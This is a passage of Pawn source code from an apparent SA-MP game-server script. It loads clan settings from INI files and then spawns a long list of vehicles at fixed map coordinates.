					claninfo[i][cvalid] = 1;
					format(claninfo[i][cname],256,fgetstring(string,"Name"));
					claninfo[i][cmembers] = 0;
					claninfo[i][cbank] = fgetint(string,"Bank2");
					claninfo[i][ccolor][0] = fgetint(string,"R");
					claninfo[i][ccolor][1] = fgetint(string,"G");
					claninfo[i][ccolor][2] = fgetint(string,"B");
					claninfo[i][chq][0] = fgetfloat(string,"X");
					claninfo[i][chq][1] = fgetfloat(string,"Y");
					claninfo[i][chq][2] = fgetfloat(string,"Z");
					claninfo[i][chq][3] = fgetfloat(string,"Rot");
					claninfo[i][chqv][0] = fgetfloat(string,"VX");
					claninfo[i][chqv][1] = fgetfloat(string,"VY");
					claninfo[i][chqv][2] = fgetfloat(string,"VZ");
					claninfo[i][chqv][3] = fgetfloat(string,"VR");
					format(claninfo[i][ccmd],256,fgetstring(string,"Command"));
					claninfo[i][ctest] = fgetint(string,"Test");
					claninfo[i][clbank] = fgetint(string,"LockBank");
					claninfo[i][cmaxbank] = fgetint(string,"MaxBank");
					claninfo[i][cmute] = 0;
					claninfo[i][cobjects] = 0;
					claninfo[i][ccp] = -1;
					if(fkeyexist(string,"Peace")) fremovekey(string,"Peace");
					if(fkeyexist(string,"CPX") && fkeyexist(string,"CPY") && fkeyexist(string,"CPZ")) claninfo[i][cbankcp] = CreateCBank(fgetfloat(string,"CPX"),fgetfloat(string,"CPY"),fgetfloat(string,"CPZ"),i,default_cpsize,default_cpdistance,1);
				}
			}
		}
		for(new i=1;i<clansCount;i++)
		{
			if(claninfo[i][cvalid])
			{
				format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[i][cname]);
				for(new ii=0;ii<MAX_CLANS;ii++) claninfo[i][cpeace][ii] = 0, claninfo[ii][cpeace][i] = 0, claninfo[i][cask][ii] = 0, claninfo[ii][cask][i] = 0;
				for(new ii=0;ii<MAX_CLANS;ii++)
				{
					if(ii == i) continue;
					format(clanName,sizeof(clanName),"Peace%d",ii);
					if(fkeyexist(string,clanName) && equal(fgetstring(string,clanName),claninfo[i][cname])) claninfo[i][cpeace][ii] = 1, claninfo[ii][cpeace][i] = 1;
				}
			}
		}
	}
	dbg(11,"6");
	CreateVehicleEx(597,2256.1926,2477.6797,10.6224,179.2554,1,2,respawntime,0,0);
	CreateVehicleEx(597,2256.192626,2477.679687,10.622400,179.255401,1,2,respawntime,0,0);
	CreateVehicleEx(599,2256.127197,2442.740722,10.958100,0.821798,1,2,respawntime,0,0);
	CreateVehicleEx(601,2269.580322,2459.744873,10.579000,358.575897,1,2,respawntime,0,0);
	CreateVehicleEx(598,2282.051025,2459.386718,10.571200,357.903411,1,2,respawntime,0,0);
	CreateVehicleEx(427,2277.600097,2475.255859,10.952098,179.965896,1,2,respawntime,0,0);
	CreateVehicleEx(411,2080.680175,2468.548339,10.547698,359.918701,3,3,respawntime,0,0);
	CreateVehicleEx(451,1899.833251,2437.554443,10.552300,269.938995,1,2,respawntime,0,0);
	CreateVehicleEx(560,2010.293212,2491.684082,10.528498,271.764404,3,3,respawntime,0,0);
	CreateVehicleEx(487,2093.274902,2414.927978,74.758003,89.040397,26,57,respawntime,0,0);
	CreateVehicleEx(560,2103.413085,2069.151123,10.522800,270.144989,33,0,respawntime,0,0);
	CreateVehicleEx(541,2156.906250,2192.652587,10.368800,1.480800,60,1,respawntime,0,0);
	CreateVehicleEx(411,2172.607910,1989.045898,10.547400,89.175796,1,2,respawntime,0,0);
	CreateVehicleEx(541,2186.904541,1974.643554,10.445400,91.203399,60,1,respawntime,0,0);
	CreateVehicleEx(541,2117.353759,1928.755615,10.367698,1.304800,60,1,respawntime,0,0);
	CreateVehicleEx(451,2195.169189,1799.689086,10.526800,359.266815,123,1,respawntime,0,0);
	CreateVehicleEx(541,2196.294433,1821.553833,10.462100,0.293998,60,1,respawntime,0,0);
	CreateVehicleEx(409,2161.132080,1682.129272,10.547900,182.430999,1,2,respawntime,0,0);
	CreateVehicleEx(451,2039.115356,1545.092529,10.377698,0.332599,123,1,respawntime,0,0);
	CreateVehicleEx(409,2037.194702,1007.582824,10.536100,180.804199,1,2,respawntime,0,0);
	CreateVehicleEx(560,2039.083374,1175.773193,10.376998,182.042495,0,0,respawntime,0,0);
	CreateVehicleEx(411,2075.213134,1259.216186,10.398900,359.966705,1,2,respawntime,0,0);
	CreateVehicleEx(411,2171.405517,1117.558715,12.354700,328.473785,1,2,respawntime,0,0);
	CreateVehicleEx(451,2192.868652,1283.528320,10.453900,359.154388,1,2,respawntime,0,0);
	CreateVehicleEx(560,2142.402832,1408.590087,10.529700,0.365599,17,1,respawntime,0,0);
	CreateVehicleEx(451,2120.054199,1397.556030,10.517700,2.382600,1,2,respawntime,0,0);
	CreateVehicleEx(451,2333.551025,1390.628173,42.822299,0.014499,1,1,respawntime,0,0);
	CreateVehicleEx(451,2320.546875,1388.776367,43.289398,1.102900,6,0,respawntime,0,0);
	CreateVehicleEx(451,2326.358154,1387.578735,42.533798,1.584800,5,0,respawntime,0,0);
	CreateVehicleEx(451,2353.800537,1412.216552,42.524101,88.446998,5,0,respawntime,0,0);
	CreateVehicleEx(451,2353.791015,1415.956420,42.526000,91.434799,2,0,respawntime,0,0);
	CreateVehicleEx(451,2353.616210,1408.530761,42.531600,87.553596,2,0,respawntime,0,0);
	CreateVehicleEx(451,2353.755371,1405.090576,42.534599,91.557601,5,0,respawntime,0,0);
	CreateVehicleEx(477,2405.371582,1668.274780,10.570598,180.889999,0,1,respawntime,0,0);
	CreateVehicleEx(477,2455.259765,1629.294555,10.573800,180.764404,0,1,respawntime,0,0);
	CreateVehicleEx(477,2816.433105,2026.426757,10.575798,357.243499,0,1,respawntime,0,0);
	CreateVehicleEx(451,2822.213378,2232.042724,10.533498,89.085197,123,1,respawntime,0,0);
	CreateVehicleEx(451,2867.677978,2330.852783,10.527298,269.492492,123,1,respawntime,0,0);
	CreateVehicleEx(451,2816.017333,2330.342773,10.519498,270.385894,123,1,respawntime,0,0);
	CreateVehicleEx(429,2750.401123,2639.694824,10.500000,203.431900,1,3,respawntime,0,0);
	CreateVehicleEx(411,2352.933593,2577.979248,10.560198,0.089598,7,7,respawntime,0,0);
	CreateVehicleEx(560,2166.661132,2741.041259,10.516598,89.781501,52,52,respawntime,0,0);
	CreateVehicleEx(411,1960.593627,2756.368896,10.547300,183.406692,112,1,respawntime,0,0);
	CreateVehicleEx(411,1925.987792,2730.146972,10.550398,359.966491,112,1,respawntime,0,0);
	CreateVehicleEx(451,1924.838867,2774.549804,10.526498,92.397102,0,0,respawntime,0,0);
	CreateVehicleEx(451,1709.492431,2699.133056,10.531800,2.806900,0,0,respawntime,0,0);
	CreateVehicleEx(411,1673.803710,2693.799316,10.562000,359.790191,1,1,respawntime,0,0);
	CreateVehicleEx(560,1589.316406,2719.328613,10.526700,357.398895,30,30,respawntime,0,0);
	CreateVehicleEx(560,1556.650878,2749.919921,10.527198,90.417098,30,30,respawntime,0,0);
	CreateVehicleEx(451,1580.449218,2838.270751,10.535799,181.525802,75,77,respawntime,0,0);
	CreateVehicleEx(451,1530.730224,2849.750732,10.528400,89.081398,75,77,respawntime,0,0);
	CreateVehicleEx(560,1491.447021,2879.459716,10.522700,180.012496,3,3,respawntime,0,0);
	CreateVehicleEx(451,1432.370971,2609.542968,10.447400,84.961196,16,16,respawntime,0,0);
	CreateVehicleEx(477,1606.207763,2603.678955,10.578300,188.572799,121,1,respawntime,0,0);
	CreateVehicleEx(567,1031.887817,1920.372802,11.358300,89.496902,97,96,respawntime,0,0);
	CreateVehicleEx(567,990.119812,1887.118286,11.205300,272.278686,97,96,respawntime,0,0);
	CreateVehicleEx(567,1024.932250,1746.453735,10.686100,271.103485,102,114,respawntime,0,0);
	CreateVehicleEx(567,711.421020,1947.541870,5.378600,179.380905,90,96,respawntime,0,0);
	CreateVehicleEx(522,661.277709,1721.667968,6.568998,46.942401,6,25,respawntime,0,0);
	CreateVehicleEx(463,-201.861801,1223.369750,19.282600,185.207595,11,11,respawntime,0,0);
	CreateVehicleEx(463,-204.100204,1223.165649,19.282600,185.207595,11,11,respawntime,0,0);
	CreateVehicleEx(522,-334.537689,1179.701538,19.513200,183.144195,25,1,respawntime,0,0);
	CreateVehicleEx(567,-2658.031005,386.209503,4.099137,0.520061,-1,-1,respawntime,0,0);
	CreateVehicleEx(451,-2657.930175,365.187683,4.080807,1.407171,-1,-1,respawntime,0,0);
	CreateVehicleEx(560,-2667.542236,373.038543,3.959587,359.650329,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,-2651.850585,391.598022,3.906984,96.957267,-1,-1,respawntime,0,0);
	CreateVehicleEx(463,2138.310546,987.467224,10.355198,179.474197,11,11,respawntime,0,0);
	CreateVehicleEx(415,2142.021240,1019.295471,10.591198,88.211502,1,2,respawntime,0,0);
	CreateVehicleEx(411,2171.505615,1007.688903,10.547400,88.070297,1,2,respawntime,0,0);
	CreateVehicleEx(560,1881.632690,960.516723,10.550800,89.598701,9,39,respawntime,0,0);
	CreateVehicleEx(560,1661.690063,987.755371,10.525600,358.104614,113,1,respawntime,0,0);
	CreateVehicleEx(522,1661.382568,1028.093627,10.385398,349.240295,58,1,respawntime,0,0);
	CreateVehicleEx(565,1553.373657,1020.288391,10.449098,270.682586,119,50,respawntime,0,0);
	CreateVehicleEx(560,1383.469116,1035.040405,10.520098,91.293701,117,227,respawntime,0,0);
	CreateVehicleEx(560,1448.239990,973.923095,10.525500,359.474700,117,227,respawntime,0,0);
	CreateVehicleEx(485,1309.604125,1279.387695,10.466198,180.468994,7,40,respawntime,0,0);
	CreateVehicleEx(530,1306.289062,1279.663085,10.561300,180.308898,29,28,respawntime,0,0);
	CreateVehicleEx(512,1285.934692,1360.518798,11.094300,270.170288,66,14,respawntime,0,0);
	CreateVehicleEx(512,1286.034179,1326.220336,11.100298,270.168395,66,14,respawntime,0,0);
	CreateVehicleEx(577,1586.490600,1189.494750,10.822198,177.175292,13,73,respawntime,0,0);
	CreateVehicleEx(487,1674.768066,1636.058715,10.974800,180.735702,89,30,respawntime,0,0);
	CreateVehicleEx(487,1664.573608,1635.425415,10.996998,181.813003,19,20,respawntime,0,0);
	CreateVehicleEx(487,1686.074218,1635.831665,11.008399,181.751205,19,20,respawntime,0,0);
	CreateVehicleEx(469,1634.350708,1527.421386,10.801300,11.725000,26,36,respawntime,0,0);
	CreateVehicleEx(469,1660.117919,1549.672851,10.799900,104.645103,107,72,respawntime,0,0);
	CreateVehicleEx(469,1650.744995,1531.114990,10.775300,1.154299,107,72,respawntime,0,0);
	CreateVehicleEx(411,2034.613037,895.540100,7.552198,271.317108,59,92,respawntime,0,0);
	CreateVehicleEx(411,2034.608764,890.547973,7.355800,271.352386,114,75,respawntime,0,0);
	CreateVehicleEx(411,2034.610473,885.507995,7.165298,270.079406,68,63,respawntime,0,0);
	CreateVehicleEx(411,2034.607055,880.557312,7.013800,271.459899,19,120,respawntime,0,0);
	CreateVehicleEx(411,2034.610107,875.575988,6.865798,270.987396,33,15,respawntime,0,0);
	CreateVehicleEx(541,2080.192382,875.276916,6.768300,89.182296,98,36,respawntime,0,0);
	CreateVehicleEx(541,2080.290771,880.242370,6.896900,89.488098,90,7,respawntime,0,0);
	CreateVehicleEx(541,2080.189208,885.275512,7.031700,89.334098,31,102,respawntime,0,0);
	CreateVehicleEx(541,2080.220458,890.284973,7.219698,87.996398,7,99,respawntime,0,0);
	CreateVehicleEx(541,2080.229980,895.214416,7.448998,89.458801,9,68,respawntime,0,0);
	CreateVehicleEx(451,2067.713134,826.638305,6.503698,1.313400,84,94,respawntime,0,0);
	CreateVehicleEx(451,2062.680908,826.627624,6.504098,1.106099,12,100,respawntime,0,0);
	CreateVehicleEx(451,2057.673828,826.700317,6.509300,1.223000,89,7,respawntime,0,0);
	CreateVehicleEx(451,2052.640380,826.698913,6.484200,3.237298,31,107,respawntime,0,0);
	CreateVehicleEx(451,2047.677001,826.694702,6.496398,2.798398,50,0,respawntime,0,0);
	CreateVehicleEx(443,2129.841308,891.321777,11.383898,181.168106,20,1,respawntime,0,0);
	CreateVehicleEx(429,2485.091064,1208.800048,10.482500,180.216003,1,2,respawntime,0,0);
	CreateVehicleEx(415,2172.916748,1787.107543,10.591698,0.332800,62,1,respawntime,0,0);
	CreateVehicleEx(539,1977.089965,1913.366333,130.294692,229.777694,48,57,respawntime,0,0);
	CreateVehicleEx(539,1976.873291,1919.570800,130.296905,283.293914,69,72,respawntime,0,0);
	CreateVehicleEx(409,2127.273925,2357.926513,10.549200,90.465599,1,1,respawntime,0,0);
	CreateVehicleEx(541,2033.655517,1917.966918,11.878298,1.516399,31,102,respawntime,0,0);
	CreateVehicleEx(560,2440.298095,2005.368774,10.552398,271.042785,66,58,respawntime,0,0);
	CreateVehicleEx(541,2625.307128,2099.663574,10.441498,180.638504,67,126,respawntime,0,0);
	CreateVehicleEx(545,2562.750488,2262.222900,10.680700,270.868804,3,114,respawntime,0,0);
	CreateVehicleEx(541,2562.727539,2275.347656,10.432498,270.350799,115,80,respawntime,0,0);
	CreateVehicleEx(487,2619.029052,2721.605712,36.717700,269.995208,27,89,respawntime,0,0);
	CreateVehicleEx(567,1499.627929,-1737.206054,13.329597,88.905090,-1,-1,respawntime,0,0);
	CreateVehicleEx(409,1476.091186,-1727.580200,13.259840,88.234916,-1,-1,respawntime,0,0);
	CreateVehicleEx(411,1462.513061,-1737.075439,13.209538,87.658966,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,1457.426879,-1747.763305,13.111358,355.914672,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,1866.105468,-1392.460937,13.067637,274.227905,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,1866.236694,-1404.535766,13.059595,267.857818,-1,-1,respawntime,0,0);
	CreateVehicleEx(416,2077.675537,1577.898559,10.887145,358.748229,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,1866.336303,-1403.097412,13.060052,264.464874,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,1866.272705,-1399.967163,13.063664,269.239624,-1,-1,respawntime,0,0);
	CreateVehicleEx(416,1599.583129,1831.782958,10.969305,0.281096,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,1866.185302,-1401.609252,13.061551,264.582855,-1,-1,respawntime,0,0);
	CreateVehicleEx(416,1610.199218,1839.393310,10.980143,181.577575,-1,-1,respawntime,0,0);
	CreateVehicleEx(416,1593.676635,1840.381591,10.984102,179.497161,-1,-1,respawntime,0,0);
	CreateVehicleEx(510,1908.708984,-1414.289916,13.178993,4.736303,-1,-1,respawntime,0,0);
	CreateVehicleEx(436,2175.878173,-1667.881103,14.789299,249.923004,87,1,respawntime,0,0);
	CreateVehicleEx(446,2306.653564,540.100708,-0.652899,181.035003,8,119,respawntime,0,0);
	CreateVehicleEx(452,2313.479736,540.335876,-0.291599,183.448303,89,50,respawntime,0,0);
	CreateVehicleEx(453,2324.454345,539.395080,-0.333200,184.486206,27,6,respawntime,0,0);
	CreateVehicleEx(454,2376.443115,539.256286,0.030300,179.840393,8,34,respawntime,0,0);
	CreateVehicleEx(472,2382.641357,539.535827,0.153898,178.736694,50,9,respawntime,0,0);
	CreateVehicleEx(493,2389.291748,540.762023,-0.155398,183.669906,77,51,respawntime,0,0);
	CreateVehicleEx(525,-1655.512573,1314.916381,6.920700,134.568206,30,20,respawntime,0,0);
	CreateVehicleEx(533,-1652.175170,1311.249023,6.763400,134.095199,73,0,respawntime,0,0);
	CreateVehicleEx(545,-1645.103881,1304.165283,6.870998,134.498992,36,99,respawntime,0,0);
	CreateVehicleEx(473,-1514.043823,1296.942626,-0.121298,358.868988,62,3,respawntime,0,0);
	CreateVehicleEx(493,-1499.793457,1300.525146,-0.228598,94.664703,21,72,respawntime,0,0);
	CreateVehicleEx(484,-1528.334960,1374.797241,0.029300,335.785400,45,23,respawntime,0,0);
	CreateVehicleEx(473,2006.981445,1504.120727,8.382100,86.072502,62,3,respawntime,0,0);
	CreateVehicleEx(473,2006.520751,1498.540283,8.337200,85.723899,62,3,respawntime,0,0);
	CreateVehicleEx(519,423.799407,2505.644531,17.419099,88.551597,83,25,respawntime,0,0);
	CreateVehicleEx(487,365.341003,2535.026367,16.813999,358.841400,17,63,respawntime,0,0);
	CreateVehicleEx(476,292.134613,2539.241699,17.531000,179.580902,118,101,respawntime,0,0);
	CreateVehicleEx(476,325.231597,2539.746337,17.523000,180.546905,26,84,respawntime,0,0);
	CreateVehicleEx(556,-2333.237060,-1667.370727,483.713592,322.413696,58,40,respawntime,0,0);
	CreateVehicleEx(556,-2328.216308,-1671.186767,483.435394,322.640502,3,31,respawntime,0,0);
	CreateVehicleEx(556,-2337.589843,-1664.504638,484.002410,325.653900,3,31,respawntime,0,0);
	CreateVehicleEx(437,-2330.723388,-1593.144897,483.787811,251.398101,40,117,respawntime,0,0);
	CreateVehicleEx(437,-2331.956298,-1596.716796,483.827514,250.578903,49,34,respawntime,0,0);
	CreateVehicleEx(437,-2333.330322,-1600.010986,483.886688,248.182403,119,34,respawntime,0,0);
	CreateVehicleEx(468,-2284.354736,-1650.249755,482.797912,62.622299,122,57,respawntime,0,0);
	CreateVehicleEx(468,-2283.896240,-1649.366455,482.820892,62.622299,122,57,respawntime,0,0);
	CreateVehicleEx(468,-2283.363769,-1648.340942,482.847595,62.622299,122,57,respawntime,0,0);
	CreateVehicleEx(468,-2282.827880,-1647.309082,482.874389,62.622299,122,57,respawntime,0,0);
	CreateVehicleEx(468,-2282.527587,-1645.667114,482.932312,63.313598,122,57,respawntime,0,0);
	CreateVehicleEx(461,-2285.854248,-1630.126220,483.293609,111.425399,107,91,respawntime,0,0);
	CreateVehicleEx(461,-2285.236572,-1631.699218,483.279296,111.425796,107,91,respawntime,0,0);
	CreateVehicleEx(461,-2284.759033,-1632.914794,483.268310,111.425796,107,91,respawntime,0,0);
	CreateVehicleEx(461,-2283.957763,-1634.955444,483.249694,111.425796,107,91,respawntime,0,0);
	CreateVehicleEx(461,-2283.297363,-1636.637084,483.234497,111.425796,107,91,respawntime,0,0);
	CreateVehicleEx(556,1391.861694,2148.576660,11.411000,84.860198,79,6,respawntime,0,0);
	CreateVehicleEx(556,1393.043579,2154.370849,11.410799,97.392196,79,6,respawntime,0,0);
	CreateVehicleEx(556,1391.391235,2142.080566,11.406900,92.871498,79,6,respawntime,0,0);
	CreateVehicleEx(556,1390.834960,2135.339355,11.411499,86.282501,79,6,respawntime,0,0);
	CreateVehicleEx(539,1302.815063,2183.339111,10.383600,271.528015,79,6,respawntime,0,0);
	CreateVehicleEx(539,1302.442749,2186.816894,10.383600,279.794586,79,6,respawntime,0,0);
	CreateVehicleEx(539,1302.386718,2190.560058,10.383600,272.612487,79,6,respawntime,0,0);
	CreateVehicleEx(539,1302.606689,2195.124511,10.383600,272.251098,79,6,respawntime,0,0);
	CreateVehicleEx(463,1381.039184,2187.246582,10.568799,135.046798,79,6,respawntime,0,0);
	CreateVehicleEx(463,1383.222412,2184.716308,10.537598,126.940399,79,6,respawntime,0,0);
	CreateVehicleEx(463,1384.763183,2182.241210,10.560500,117.197303,79,6,respawntime,0,0);
	CreateVehicleEx(444,-2061.115722,-107.186599,35.667701,179.912002,21,11,respawntime,0,0);
	CreateVehicleEx(444,-2068.584716,-107.187202,35.707698,179.913406,34,66,respawntime,0,0);
	CreateVehicleEx(444,-2076.092529,-107.187103,35.703998,179.905197,31,77,respawntime,0,0);
	CreateVehicleEx(444,-2083.588867,-107.186996,35.702400,179.908203,66,101,respawntime,0,0);
	CreateVehicleEx(444,-2091.086669,-107.186599,35.703498,179.923294,109,15,respawntime,0,0);
	CreateVehicleEx(468,-661.791015,2302.884277,135.696502,90.564498,117,43,respawntime,0,0);
	CreateVehicleEx(539,-662.529785,2306.307128,135.463806,91.117797,75,85,respawntime,0,0);
	CreateVehicleEx(522,1528.505737,-1347.779907,329.091186,52.238601,89,60,respawntime,0,0);
	CreateVehicleEx(522,1538.250610,-1340.250366,329.137512,19.700000,17,15,respawntime,0,0);
	CreateVehicleEx(522,1550.712524,-1340.360961,329.099304,327.619995,107,36,respawntime,0,0);
	CreateVehicleEx(487,257.922302,-2094.627441,-28.096900,180.116500,126,1,respawntime,0,0);
	CreateVehicleEx(487,246.834594,-2093.234619,-28.086900,180.009902,7,118,respawntime,0,0);
	CreateVehicleEx(487,236.065795,-2093.269042,-28.085899,179.859497,3,6,respawntime,0,0);
	CreateVehicleEx(573,166.321701,-1855.597656,4.039000,272.646789,126,1,respawntime,0,0);
	CreateVehicleEx(573,167.262405,-1849.542602,4.150700,276.005310,0,1,respawntime,0,0);
	CreateVehicleEx(539,201.204803,-1868.491699,2.157099,96.374000,126,1,respawntime,0,0);
	CreateVehicleEx(539,245.786102,-1868.382446,1.796599,87.931198,0,1,respawntime,0,0);
	CreateVehicleEx(539,289.241302,-1868.698364,1.991199,92.238800,0,0,respawntime,0,0);
	CreateVehicleEx(539,338.048400,-1868.594970,2.221899,271.514495,86,5,respawntime,0,0);
	CreateVehicleEx(539,-1808.247802,576.636596,234.250793,177.119903,126,1,respawntime,0,0);
	CreateVehicleEx(539,-1821.500976,550.688781,234.249206,306.425506,126,1,respawntime,0,0);
	CreateVehicleEx(539,-1792.278930,551.719482,234.249496,58.191299,126,1,respawntime,0,0);
	CreateVehicleEx(468,674.011474,926.722595,-41.235000,138.977294,38,105,respawntime,0,0);
	CreateVehicleEx(468,673.442687,927.216918,-41.217399,138.966903,38,105,respawntime,0,0);
	CreateVehicleEx(468,672.811706,927.765075,-41.197898,138.966903,38,105,respawntime,0,0);
	CreateVehicleEx(468,672.140380,928.338195,-41.084800,139.185302,38,105,respawntime,0,0);
	CreateVehicleEx(468,671.573120,928.825683,-41.043098,139.200103,38,105,respawntime,0,0);
	CreateVehicleEx(468,671.220214,929.128723,-41.017200,139.220397,38,105,respawntime,0,0);
	CreateVehicleEx(495,607.437805,814.373107,-42.636798,320.615203,66,27,respawntime,0,0);
	CreateVehicleEx(495,611.911193,812.346984,-42.598098,351.393890,66,27,respawntime,0,0);
	CreateVehicleEx(495,559.248718,921.186523,-42.640800,201.453002,78,115,respawntime,0,0);
	CreateVehicleEx(486,523.302307,850.189880,-42.727298,278.465087,43,0,respawntime,0,0);
	CreateVehicleEx(486,692.492370,861.960693,-42.276100,73.732803,43,0,respawntime,0,0);
	CreateVehicleEx(486,645.253112,807.224914,-42.750400,340.131713,43,0,respawntime,0,0);
	CreateVehicleEx(537,-1943.512451,153.077102,27.224500,357.743286,49,67,respawntime,0,0);
	CreateVehicleEx(538,1475.8794,2632.2500,12.3495,270.0000,1,1,respawntime,0,0);
	CreateVehicleEx(510,1922.029418,-1413.525512,13.178494,2.809739,-1,-1,respawntime,0,0);
	CreateVehicleEx(510,1926.006713,-1413.573974,13.178760,4.254402,-1,-1,respawntime,0,0);
	CreateVehicleEx(510,1920.609252,-1413.514770,13.178380,5.752490,-1,-1,respawntime,0,0);
	CreateVehicleEx(510,1913.622436,-1413.974121,13.178572,8.463517,-1,-1,respawntime,0,0);
	CreateVehicleEx(510,1923.588256,-1413.454101,13.179017,357.926544,-1,-1,respawntime,0,0);
	CreateVehicleEx(423,2141.108154,1012.809387,10.845767,89.903358,-1,-1,respawntime,0,0);
	CreateVehicleEx(521,2322.923339,-1435.497802,23.569700,151.091506,102,23,respawntime,0,0);
	CreateVehicleEx(521,2330.823974,-1449.772827,23.547599,89.412101,124,116,respawntime,0,0);
	CreateVehicleEx(521,2328.290283,-1458.701660,23.547500,55.716400,43,70,respawntime,0,0);
	CreateVehicleEx(521,-1467.838500,1557.077270,1052.091674,5.882699,111,101,respawntime,14,0);
	CreateVehicleEx(521,-1469.338500,1557.077270,1052.089477,5.883200,31,64,respawntime,14,0);
	CreateVehicleEx(522,-1470.850219,1557.079589,1052.089355,5.946300,90,42,respawntime,14,0);
	CreateVehicleEx(521,-1472.358520,1557.077880,1052.089355,5.991700,62,85,respawntime,14,0);
	CreateVehicleEx(522,-1473.872558,1557.082275,1052.089233,6.059898,73,29,respawntime,14,0);
	CreateVehicleEx(521,-1475.453491,1557.060546,1052.083496,2.434499,43,6,respawntime,14,0);
	CreateVehicleEx(522,-1476.881103,1557.080322,1052.091430,5.520898,18,100,respawntime,14,0);
	CreateVehicleEx(521,-1478.416259,1557.068359,1052.089355,3.678498,22,58,respawntime,14,0);
	CreateVehicleEx(593,-1462.477416,-524.281494,14.673000,204.813400,70,36,respawntime,14,0);
	CreateVehicleEx(593,-1429.278442,-505.815093,14.669400,205.640899,78,21,respawntime,14,0);
	CreateVehicleEx(522,-1330.290405,-633.581970,13.714098,358.245300,12,60,respawntime,14,0);
	CreateVehicleEx(521,-1331.869506,-633.533630,13.714098,358.245208,12,60,respawntime,14,0);
	CreateVehicleEx(522,-1333.378662,-633.487426,13.714098,358.245208,12,60,respawntime,14,0);
	CreateVehicleEx(521,-1335.175292,-633.432373,13.714098,358.245086,12,60,respawntime,14,0);
	CreateVehicleEx(522,-1337.249145,-633.368774,13.714098,358.245086,12,60,respawntime,14,0);
	CreateVehicleEx(521,-1339.123413,-633.311401,13.714098,358.245086,12,60,respawntime,14,0);
	CreateVehicleEx(522,-1340.270629,-633.276184,13.714098,358.245086,12,60,respawntime,14,0);
	CreateVehicleEx(521,-1341.818969,-633.228698,13.714200,358.244812,12,60,respawntime,14,0);
	CreateVehicleEx(522,-1344.548339,-633.145019,13.714200,358.244812,12,60,respawntime,14,0);
	CreateVehicleEx(420,1695.384521,1306.359985,10.602998,178.007598,6,1,respawntime,0,0);
	CreateVehicleEx(420,1695.373046,1297.342895,10.602998,359.454101,6,1,respawntime,0,0);
	CreateVehicleEx(420,1689.581787,1306.412231,10.627698,177.972595,6,1,respawntime,0,0);
	CreateVehicleEx(420,1677.983520,1306.362548,10.600198,177.856994,6,1,respawntime,0,0);
	CreateVehicleEx(420,1663.428222,1297.327514,10.592000,359.904785,6,1,respawntime,0,0);
	CreateVehicleEx(447,1602.799194,1447.541992,33.541801,269.613006,84,27,respawntime,0,0);
	CreateVehicleEx(447,1645.978027,1447.418090,29.946598,89.994003,96,83,respawntime,0,0);
	CreateVehicleEx(423,2151.254150,987.379455,10.845587,359.077545,-1,-1,respawntime,0,0);
	CreateVehicleEx(423,2154.779541,987.373474,10.845043,359.705718,-1,-1,respawntime,0,0);
	CreateVehicleEx(423,2157.909423,987.246032,10.843454,0.810319,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,1866.130004,-1394.244750,13.065725,269.057128,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,1866.324340,-1398.376831,13.062420,274.517059,-1,-1,respawntime,0,0);
	CreateVehicleEx(522,1866.356933,-1396.530029,13.068078,265.261260,-1,-1,respawntime,0,0);
	CreateVehicleEx(510,1919.394775,-1413.644775,13.178773,8.749257,-1,-1,respawntime,0,0);
	CreateVehicleEx(510,1917.882202,-1413.848388,13.178372,9.683245,-1,-1,respawntime,0,0);
	CreateVehicleEx(510,1915.171752,-1413.758789,13.178825,4.958036,-1,-1,respawntime,0,0);
	CreateVehicleEx(510,1911.471191,-1414.213256,13.178911,359.435028,-1,-1,respawntime,0,0);
	CreateVehicleEx(510,1909.937622,-1414.219238,13.178794,353.700744,-1,-1,respawntime,0,0);
	CreateVehicleEx(495,829.3556,826.0439,12.2916,22.8967,14,0,respawntime,0,world_normal); //
	CreateVehicleEx(495,833.4778,827.9105,12.5616,21.3595,3,0,respawntime,0,world_normal); //
	CreateVehicleEx(495,837.5490,829.6143,12.8447,17.0808,2,0,respawntime,0,world_normal); //
	CreateVehicleEx(495,841.6370,831.3117,13.2018,17.2304,6,0,respawntime,0,world_normal); //
	CreateVehicleEx(495,845.7873,832.7324,13.5685,18.6741,84,0,respawntime,0,world_normal); //
	CreateVehicleEx(495,849.6242,834.4374,13.7054,20.8244,0,0,respawntime,0,world_normal); //
	CreateVehicleEx(495,825.9319,833.7803,11.7120,22.0781,70,0,respawntime,0,world_normal); //
	CreateVehicleEx(495,830.6148,835.5699,12.0477,20.4045,60,0,respawntime,0,world_normal); //
	CreateVehicleEx(495,834.8734,837.3067,12.3729,17.9827,86,0,respawntime,0,world_normal); //
	CreateVehicleEx(495,839.0061,838.7899,12.7534,18.2954,30,0,respawntime,0,world_normal); //
	CreateVehicleEx(495,842.8843,840.1522,13.1090,21.7920,2,0,respawntime,0,world_normal); //
	CreateVehicleEx(495,846.5298,841.9124,13.4340,22.0092,6,0,respawntime,0,world_normal); //
	CreateVehicleEx(468,820.8332,857.5222,11.5897,200.9840,2,0,respawntime,0,world_normal); //
	CreateVehicleEx(468,822.1678,858.2458,11.6820,207.2076,3,0,respawntime,0,world_normal); //
	CreateVehicleEx(468,823.7277,858.6232,11.7678,204.3354,6,0,respawntime,0,world_normal); //
	CreateVehicleEx(471,825.2090,859.3233,11.6804,203.3231,2,0,respawntime,0,world_normal); //
	CreateVehicleEx(471,827.1116,860.0803,11.8014,202.8000,3,0,respawntime,0,world_normal); //
	CreateVehicleEx(471,829.1541,860.8486,11.9305,203.1995,6,0,respawntime,0,world_normal); //
	CreateVehicleEx(425,1359.5420,-1703.4774,9.1684,1.7061,-1,-1,respawntime,0,world_normal); // hunter
	CreateVehicleEx(520,-70.6797,-3606.5576,35.6453,327.0213,-1,-1,respawntime,0,world_normal); // hydra_maze
	CreateVehicleEx(520,-86.1628,-3598.0112,35.6485,159.9205,-1,-1,respawntime,0,world_normal); // hydra_maze
	CreateVehicleEx(449,-2006.5000,166.2609,27.9973,0.0000,-1,-1,respawntime,0,world_normal); // tram
	CreateVehicleEx(432,227.7198,1889.4132,17.6554,179.8515,43,0,respawntime,0,world_normal); // rhino
	CreateVehicleEx(520,310.2560,1882.9021,18.3639,101.7061,0,0,respawntime,0,world_normal); // hydra
